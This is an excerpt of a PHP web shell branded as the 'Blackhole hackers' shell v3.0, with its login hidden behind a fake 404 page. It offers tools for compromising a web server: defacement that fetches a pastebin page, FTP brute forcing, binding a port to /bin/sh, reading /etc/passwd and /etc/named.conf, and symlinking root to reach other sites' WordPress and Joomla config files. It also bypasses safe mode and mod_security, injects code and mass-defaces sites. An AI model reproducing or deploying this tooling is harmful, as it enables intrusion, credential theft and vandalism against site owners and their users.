...
Contact Me :
[#] www.facebook.com/Blackhole

All Rights Reserved - Blackhole© (Team MaDLeeTs) :D
*/
$auth_pass = "a116cf164223a9a40c9d22eaa33b3c09"; //(MD5) Default: AGPriv8ShellV3.0
$color = "#00ff00";
...
@define('VERSION', 'Ver 3.0 (by Blackhole)');
...
function printLogin() {
    echo '<title>404 - File or directory not found.</title>
<style type="text/css">
...
<div id="content">
 <div class="content-container"><fieldset>
  ...
  <h3>The resource you are looking for might have been removed, had its name changed, or is temporarily unavailable.</h3>
          ...
          <center><form method=post><input type=password name=pass style="border:none background-color: #EEEEEE;"></form></center>';
    exit;
}
...
function printHeader() {
    ...
    echo '<html><head><meta http-equiv="Content-Type" content="text/html; charset='.$_POST['charset'].'"><title>Blackhole hackers pvt. Shell v3.0</title>
    <style>
        ...
        div.content    { padding: 5px;margin:0 5px;background: #000000;border-bottom:1px solid #00ff00;}
        a            { text-decoration:none; }
        a:hover        { /*background:#5e5e5e;*/ }
        .ml1        { border:1px solid #000000;padding:5px;margin:0;overflow: auto; }
        .bigarea    { width:100%;height:250px;margin-top:5px;}
        input, textarea, select    { margin:0;color:#00ff00;background-color:#000000;border:1px solid '.$color.'; font: 9pt Monospace,"Courier New"; }
        ...
        .menu th:hover{background:#000000;}
        .l1 {background-color:#000000;}
    ...
    <head><body><div style="position:absolute;width:100%;top:0;left:0;"><div style="margin:5px;background:#000000;"><div class="content" style="border-top:1px solid #00ff00;">
    ...
    echo '<table class="info" cellpadding="0" cellspacing="0" width="100%"><tr><td width="160px"><img src="https://s12.postimg.org/jq5zees0t/13532923_1044356842268315_8258633641232953291_n.jpg" height="150" width="150"><sup>&reg;</sup></div></td>
         ...
         '<td width=1><nobr><span>Box`s IP</span><br><span>Your IP</span><br /><span>HDD</span><br /><span>Free</span><br /><span>PHP</span><br /><span>Safe Mode</span><br /><span>Domains</span></nobr></td>'.
         ...
         '</div></div><div style="margin:5;background:#000000;"><div class="content" style="border-top:1px solid #00ff00;padding:2px;"><table cellpadding="3" cellspacing="0" width="100%" class="menu"><tr>'.$menu.'</tr></table></div></div><div style="margin:5;background:#000000;">';
}
...
echo '</div><div style="margin:5px;background:#000000;"><div class="content" style="border-top:1px solid #00ff00;">
...
<div style="margin:5px;background:#000000;"><div class="content" style="border-top:1px solid #00ff00;text-align:center;font-weight:bold;">This Shell Belongs to Blackhole hackers &copy;, Contact www.facebook.com/Blackhole hackers If Found !! 3:)</div></div>
</div>
</body></html>';
}
...
function viewPermsColor($f) { 
    ...
    elseif (!@is_writable($f))
        ...
        return '<font color=#00FF00><b>'.perms(@fileperms($f)).'</b></font>';
}
...
function actionFilesMan() {
    ...
    if(isset($_POST['p1']) && $_POST['p1']=='deface') {
        $def = file_get_contents('http://pastebin.com/download.php?i=Q72TEV9B');
    ...
    echo '</select>&nbsp;<input type="submit" value=">>"></td><td colspan="2" align="right" width="1"><input name="def" id="def" value="Blackhole.html" size="10"/>&nbsp;<input type="button" onclick="g(\'FilesMan\',\''.htmlspecialchars($GLOBALS['cwd']).'\',\'deface\',document.getElementById(\'def\').value)" value="Add Deface Here"></td></tr>
    </form></table></div>';
    printFooter();
}
...
";
            ...
            echo '<table cellspacing=1 cellpadding=5 bgcolor=#000000><tr><td bgcolor=#000000><span style="font-weight: normal;"><pre>'.$h[0].'</pre></span></td><td bgcolor=#282828><pre>'.$h[1].'</pre></td><td bgcolor=#000000><pre>'.htmlspecialchars($h[2]).'</pre></td></tr></table>';
            break;
        case 'rename':
            if( !empty($_POST['p3']) ) {
...
";
    ...
    $temp = ob_get_clean();
    printHeader();
    echo '<h1>ByPass Safe Mode !</h1><div class=content>';
...
function actionLogout() {
    ...
    echo '<body bgcolor=#000000><center><img src="http://images.all-free-download.com/images/graphiclarge/abstract_indian_shiny_flag_black_tricolor_wave_6818267.jpg"></center></body>';
}
...
function actionSelfRemove() {
    ...
    if($_POST['p1'] == 'yes') {
        if(@unlink(SELF_PATH))
            die('Thank You For Your Hospitality, Blackhole !!');
        else
            echo 'unlink error!';
    }
    echo '<h1>Suicide</h1><div class=content>You really want to remove me?<br><a href=# onclick="g(null,null,\'yes\')">Yes</a></div>';
    printFooter();
}
...
function actionBruteforce() {
    ...
    echo '<h1>FTP BruteForce</h1><div class=content><table><form method=post><tr><td><span>Type</span></td>'
        ...
        .'<td><input type=text name=login value="Blackhole"></td></tr>'
...
function actionNetwork() {
    ...
    echo '<h1>Network-ing Tools</h1><div class=content>
    <form name=\'nfp\' onSubmit="g(null,null,this.using.value,this.port.value,this.pass.value);return false;">
    <br /><span>Bind port to /bin/sh</span><br/>
    Port: <input type=\'text\' name=\'port\' value=\'443\'> Password: <input type=\'text\' name=\'pass\' value=\'Blackhole\'> Using: <select name="using"><option value=\'bpc\'>C</option><option value=\'bpp\'>Perl</option></select> <input type=submit value=">>">
    </form>
...
function actionReadable() {
    ...
    if($sm) {
        ...
        if (!$passwd) { 
            echo '<br /><b>[#] Error : couldn`t read /etc/passwd</b><br /><br />'; 
        } else {
            $pub = array();
            $users = array();
            $conf = array();
...
Require None\
Satisfy Any";
        $hfp =@fopen ('Blackhole_sym/.htaccess','w');
        fwrite($hfp ,$hdt);
        if(function_exists('symlink')) {
            @symlink('/','Blackhole_sym/root');
        }
        $d0mains = @file('/etc/named.conf');
        if(!$d0mains) {
            echo "<pre class=ml1 style='margin-top:5px'># Cant access this file on server -> [ /etc/named.conf ]</pre></center>";
            ...
            foreach($dt as $d) {
                $r = explode(':',$d);
                if(strpos($r[5],'home')) {
                    echo "<tr".($l?' class=l1':'')."><td>".$j."</td><td>---</td><td>".$r[0]."</td><td><a href='Blackhole_sym/root".$r[5]."/public_html' target='_blank'>symlink</a></td></tr>";
                    $l=$l?0:1;
                    $j++;
                }
            }            
            ...
            foreach($usr as $r) {
                echo "<tr".($l?' class=l1':'')."><td>".$count++."</td>
                                                 ...
                                                 <td>'.$r."</td>
                                                 <td><a href='Blackhole_sym/root".$passwd[$r]."/public_html' target='_blank'>symlink</a></td></tr>";
                flush();
                $l=$l?0:1;
                $j++;
            }
            ...
            foreach($d0mains as $d0main){
                if(@eregi('zone',$d0main)){
                    ...
                    if(strlen(trim($domain[1][0]))>2){
                        ...
                        $c1 = $burl.'/Blackhole_sym/root/home/'.$user['name'].'/public_html/wp-config.php';
                        $ch01 = get_headers($c1);
                        $cf01 = $ch01[0];
                        $c2 = $burl.'/Blackhole_sym/root/home/'.$user['name'].'/public_html/blog/wp-config.php';
                        $ch02 = get_headers($c2);
                        $cf02 = $ch02[0];
                        $c3 = $burl.'/Blackhole_sym/root/home/'.$user['name'].'/public_html/configuration.php';
                        $ch03 = get_headers($c3);
                        $cf03 = $ch03[0];
                        $c4 = $burl.'/Blackhole_sym/root/home/'.$user['name'].'/public_html/joomla/configuration.php';
                        $ch04 = get_headers($c4);
                        $cf04 = $ch04[0];
                        $c5 = $burl.'/Blackhole_sym/root/home/'.$user['name'].'/public_html/includes/config.php';
                        $ch05 = get_headers($c5);
                        $cf05 = $ch05[0];
                        $c6 = $burl.'/Blackhole_sym/root/home/'.$user['name'].'/public_html/vb/includes/config.php';
                        $ch06 = get_headers($c6);
                        $cf06 = $ch06[0];
                        $c7 = $burl.'/Blackhole_sym/root/home/'.$user['name'].'/public_html/forum/includes/config.php';
                        $ch07 = get_headers($c7);
                        $cf07 = $ch07[0];
                        $c8 = $burl.'/Blackhole_sym/root/home/'.$user['name'].'public_html/clients/configuration.php';
                        $ch08 = get_headers($c8);
                        $cf08 = $ch08[0];
                        $c9 = $burl.'/Blackhole_sym/root/home/'.$user['name'].'/public_html/support/configuration.php';
                        $ch09 = get_headers($c9);
                        $cf09 = $ch09[0];
                        $c10 = $burl.'/Blackhole_sym/root/home/'.$user['name'].'/public_html/client/configuration.php';
                        $ch10 = get_headers($c10);
                        $cf10 = $ch10[0];
                        $c11 = $burl.'/Blackhole_sym/root/home/'.$user['name'].'/public_html/submitticket.php';
                        $ch11 = get_headers($c11);
                        $cf11 = $ch11[0];
                        $c12 = $burl.'/Blackhole_sym/root/home/'.$user['name'].'/public_html/client/configuration.php';
                        $ch12 = get_headers($c12);
                        $cf12 = $ch12[0];
                        $c13 = $burl.'/Blackhole_sym/root/home/'.$user['name'].'/public_html/includes/configure.php';
                        $ch13 = get_headers($c13);
                        $cf13 = $ch13[0];
                        $c14 = $burl.'/Blackhole_sym/root/home/'.$user['name'].'/public_html/include/app_config.php';
                        $ch14 = get_headers($c14);
                        $cf14 = $ch14[0];
                        $c15 = $burl.'/Blackhole_sym/root/home/'.$user['name'].'/public_html/sites/default/settings.php';
...
function actionBypass() {
    ...
    echo '<div class="content">';
    echo "<div class=header><center><h3><span>| SAFE MODE, MOD SECURITY DISABLED & PERL 500 (INTERNAL ERROR) BYPASS |</span></h3>Following php.ini and .htaccess(mod) and perl(.htaccess)[convert perl extention *.pl => *.sh  ] files create in following dir<br>| ".$GLOBALS['cwd']." |<br><br />";
...
function actionInjector(){
    ...
    if(isset($_POST['submit']) && $_POST['submit']=='Inject') {
        ...
        $code = $_POST['code'] ? $_POST['code'] : 'Team Blackhole';
...
function actionDomain() {
                                                                    ...
                                                                    if (!$file) {
                                                                        die("# Can't Read [/etc/named.conf] ... Sorry ! :( ");
                                                                    }
...
<tr><td colspan=2>[#] There are : [ <b>" . count($domains) . "</b> ] Domain(s) on this box ... * I Suggest That You Should Pwn it ;) :D*</td></tr>
...
<br>Text Content : <input type=text name=Contents size=20 value="Hacked by Mr. Angelo king "> 
<br><input type=submit value="Update kar de !!!!!!"></p></form>
...
-----------------------------------------------<br><br> ";
                                                                        ...
                                                                        echo "-----------------------------------------------<br><br>[+] Script by Mr. Angelo king  [+]";
                                                                    }
                                                                    echo '</div>';
                                                                    printFooter();
                                                                }
																...
																function actionDefacer() {
                                                                    printHeader();
                                                                    echo "<h1>Recursive Mass Defacer out </h1><div class=content>";
...
<span style='color:White;font-family:Iceland;text-shadow:red 0px 0px 5px' 'font-size:='' 20pt;'=''>Powered by Blackhole India</span></marquee></center>
<body>";
...
echo "<h3><div class='result'><i><font style='color:White;font-family:Iceland;text-shadow:blue 0px 0px 5px'>Blackhole India </font></h3>";
...
echo '<font color=red>   [-]==================[ Ye loo jumping ]==================[-]<br></font>';
...
if($_POST['a'] == 'ZHposter')
{
				...
				if (empty($hacker9))
				{
					die ("[#] You Must Fill In The Attacker Name !");
				}
				...
				elseif(empty($site9)) 
				{
					die("[#] You Must Enter the Sites List ! ");
				}
